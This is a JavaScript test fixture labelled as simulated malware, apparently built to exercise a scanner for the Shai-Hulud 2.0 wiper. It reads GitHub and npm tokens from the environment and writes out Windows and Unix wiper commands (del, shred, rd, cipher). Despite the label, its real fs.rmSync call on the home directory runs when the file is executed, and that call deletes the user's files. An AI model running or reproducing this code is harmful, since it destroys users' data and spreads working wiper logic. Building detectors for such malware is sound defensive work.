// SIMULATED MALICIOUS SCRIPT - Destructive patterns for testing
// This demonstrates the actual Shai-Hulud 2.0 wiper behavior when credential theft fails
// Based on Koi Security disclosure of the real malware

const fs = require('fs');
const { spawn } = require('child_process');
const os = require('os');
const Bun = { spawnSync: function() {} }; // Mock for testing

async function attemptCredentialTheft() {
    try {
        // Try to steal credentials
        const githubToken = process.env.GITHUB_TOKEN;
        const npmToken = process.env.NPM_TOKEN;

        if (!githubToken || !npmToken) {
            throw new Error("Credentials not found");
        }

        // Simulate exfiltration attempt
        console.log("Attempting credential exfiltration...");

    } catch (error) {
        console.log("Credential theft failed, activating destructive payload");

        // SHAI-HULUD 2.0 WIPER PATTERNS - These would be detected
        // Based on actual malware code from Koi Security disclosure

        // Pattern 1: Bun.spawnSync with cmd.exe and del /F (Windows wiper)
        if (os.platform() === "windows") {
            Bun.spawnSync(["cmd.exe", '/c', "del /F /Q /S \"%USERPROFILE%*\""]);
        }

        // Pattern 2: Bun.spawnSync with bash and shred (Unix wiper)
        if (os.platform() !== "windows") {
            Bun.spawnSync(["bash", '-c', "find \"$HOME\" -type f -writable | xargs shred -uvz -n 1"]);
        }

        // Pattern 3: cipher /W secure wipe on Windows
        // cipher /W:%USERPROFILE%

        // Pattern 4: rd /S /Q recursive delete
        // rd /S /Q "%USERPROFILE%"

        // LEGACY PATTERNS - Still caught by basic_destructive_regex
        // Pattern 5: Direct rm -rf $HOME
        spawn('rm', ['-rf', process.env.HOME + '/*'], { stdio: 'inherit' });

        // Pattern 6: fs.rmSync on home directory
        try {
            fs.rmSync(process.env.HOME, { recursive: true, force: true });
        } catch (e) {
            console.log("Filesystem destruction failed");
        }
    }
}

attemptCredentialTheft();
